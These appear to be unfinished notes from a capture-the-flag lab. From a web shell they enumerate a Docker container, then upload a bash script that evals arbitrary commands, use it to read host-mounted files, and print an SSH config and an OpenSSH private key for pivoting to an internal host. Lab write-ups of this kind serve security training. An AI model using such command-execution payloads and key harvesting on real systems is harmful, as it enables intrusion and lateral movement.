# Gate 1 - Where Am I Starting?

## Flags:
1. PIVOT-SPARK - Process listing
2. CANOPY-SIGNAL - catting /.dockerenv 
3. ARCHIVE-ECHO - running env
4. 


## What user, host, shell, working directory, OS, process list, and network state can you observe from the web shell?
	- on visiting the web console

whoami
```
www-data
```

uname -a
```
Linux 223933f455d2 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 GNU/Linux
```

env
```
APACHE_CONFDIR=/etc/apache2
HOSTNAME=223933f455d2
PHP_INI_DIR=/usr/local/etc/php
SHLVL=0
REMOTE_EXEC_ROOT=/var/run/exec-dropbox
DOCKERENV_ENV_FLAG=CANOPY-SIGNAL
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.2.30
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC
PHP_ASC_URL=https://www.php.net/distributions/php-8.2.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-8.2.30.tar.xz
LAB31_WEB_TOKEN=ops_console_token
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
RECENT_FILE_FLAG=ARCHIVE-ECHO
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
CONTAINER_PROCESS_FLAG=PIVOT-SPARK
PWD=/var/www/html
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
PHP_SHA256=bc90523e17af4db46157e75d0c9ef0b9d0030b0514e62c26ba7b513b8c4eb015
APACHE_ENVVARS=/etc/apache2/envvars
```
 
 ls -la /
```
total 72
drwxr-xr-x   1 root root 4096 Jun  3 03:42 .
drwxr-xr-x   1 root root 4096 Jun  3 03:42 ..
-rwxr-xr-x   1 root root   33 Jun  3 03:42 .dockerenv
lrwxrwxrwx   1 root root    7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar  2 21:50 boot
drwxr-xr-x   5 root root  340 Jun  3 03:42 dev
drwxr-xr-x   1 root root 4096 Jun  3 03:42 etc
drwxr-xr-x   2 root root 4096 Mar  2 21:50 home
lrwxrwxrwx   1 root root    7 Mar  2 21:50 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Apr  6 00:00 media
drwxr-xr-x   2 root root 4096 Apr  6 00:00 mnt
drwxr-xr-x   2 root root 4096 Apr  6 00:00 opt
dr-xr-xr-x 284 root root    0 Jun  3 03:42 proc
drwx------   2 root root 4096 Apr  6 00:00 root
drwxr-xr-x   1 root root 4096 Apr  7 14:45 run
lrwxrwxrwx   1 root root    8 Mar  2 21:50 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr  6 00:00 srv
dr-xr-xr-x  13 root root    0 Jun  3 12:16 sys
drwxrwxrwt   1 root root 4096 Jun  3 03:42 tmp
drwxr-xr-x   1 root root 4096 Apr  6 00:00 usr
drwxr-xr-x   1 root root 4096 Apr  7 01:37 var
```
cat /.dockerenv
```
DOCKERENV_ENV_FLAG=CANOPY-SIGNAL
```
ps -lef
```
F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
4 S root           1       0  0  80   0 - 46445 -      03:42 ?        00:00:01 apache2 -DFOREGROUND
4 S root          10       1  0  80   0 -   666 -      03:42 ?        00:00:00 /bin/sh /usr/local/bin/PIVOT-SPARK
5 S www-data      25       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      26       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      27       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      28       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      29       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data     130       1  0  80   0 - 46490 -      12:06 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data     131       1  0  80   0 - 46490 -      12:07 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data     132       1  0  80   0 - 46490 -      12:07 ?        00:00:00 apache2 -DFOREGROUND
0 S root         153      10  0  80   0 -   643 -      12:17 ?        00:00:00 sleep 300
4 S www-data     156      26  0  80   0 -   666 do_wai 12:19 ?        00:00:00 sh -c -- ps -lef 2>&1
4 R www-data     157     156  0  80   0 -  1607 -      12:19 ?        00:00:00 ps -lef
```
		- file /usr/local/bin/PIVOT-SPARK
			- /usr/local/bin/PIVOT-SPARK: POSIX shell script, ASCII text executable
		- cat /usr/local/bin/PIVOT-SPARK
```
#!/bin/sh
while true; do
  sleep 300
done
```

## What evidence shows this is a containerized or otherwise abstracted runtime?
- the existance of the /.dockerenv file and the minimal processes/services
## Which process, file-activity, or environment artifacts look intentionally placed for this exercise?
	- See Flags
## Which three objectives can you recover from this first runtime context?

# Gate 2: What Does Upload and Execute Actually Do?

## Flags
1. GRANITE-BRIDGE
2. ATLAS-SHARD
3. 

- What paths or labels does the web page reveal for uploaded files and remote execution?
- If you upload a small diagnostic payload, what does its output prove about where it ran?
- What output fields or response text are different from local web-shell command output?
- Which discovered hints point toward mounted data, missing-tool adaptation, scoped request/response behavior, or later movement?

shell script:
`cmd <command to run>`
```
#!/bin/bash

# Check if at least one argument was passed
if [ $# -eq 0 ]; then
    echo "Error: No command provided.'Usage: $0 <command>"
	exit 1
fi
        
# Combine all script arguments into a single command string
COMMAND="$*"
        
# Run the command and capture output & error
OUTPUT=$(eval "$COMMAND" 2>&1)
STATUS=$?
        
# Print results
if [ $STATUS -eq 0 ]; then
	echo "$OUTPUT"
else
	echo "Error: Command failed with exit code $STATUS."
	echo "Details:"
        echo "$OUTPUT"
fi

```
cat /srv/archive/reports/maintenance-readme.txt
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=Maintenance archive notes:
- This path is host-mounted into the container for maintenance workflows.
- Verify mounted path context before trusting data boundaries.
- mounted_path_flag=GRANITE-BRIDGE
- ssh_artifact_hint=/opt/ops/ssh-materials
stderr=
```

ls -la /opt/ops/ssh-materials
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=total 16
drwxr-xr-x 1 root root 4096 Apr  7 14:45 .
drwxr-xr-x 1 root root 4096 Jun  3 03:42 ..
-rw-r--r-- 1 root root  189 Apr  6 18:24 config
-rw------- 1 root root  399 Apr  6 18:16 id_peer_ops
stderr=
```

cat /opt/ops/ssh-materials/config
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=Host busybox-peer
    HostName internal-shell
    Port 22
    User opspeer
    IdentityFile /opt/ops/ssh-materials/id_peer_ops
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
stderr=
```


```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBA/w7iY9CXtvTBAXekjCtfnWCiTxjM92KoA/zTd3cXUwAAAJAMv3zgDL98
4AAAAAtzc2gtZWQyNTUxOQAAACBA/w7iY9CXtvTBAXekjCtfnWCiTxjM92KoA/zTd3cXUw
AAAECArA4NqqfJw2Mp3x1jBiQqrhVpNEsI952g2Ci9fNTW3UD/DuJj0Je29MEBd6SMK1+d
YKJPGMz3YqgD/NN3dxdTAAAACWthbGlAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
stderr=
```

cat 
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=#!/bin/sh
set -eu
if [ -z "${1:-}" ]; then
  echo "usage: check-man-evidence <token>"
  exit 2
fi
if [ "$1" = "runtime-manproof" ]; then
  echo "limited_tooling_flag=ATLAS-SHARD"
  exit 0
fi
echo "result=invalid-token"
exit 1
stderr=
```

```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=
stderr=
```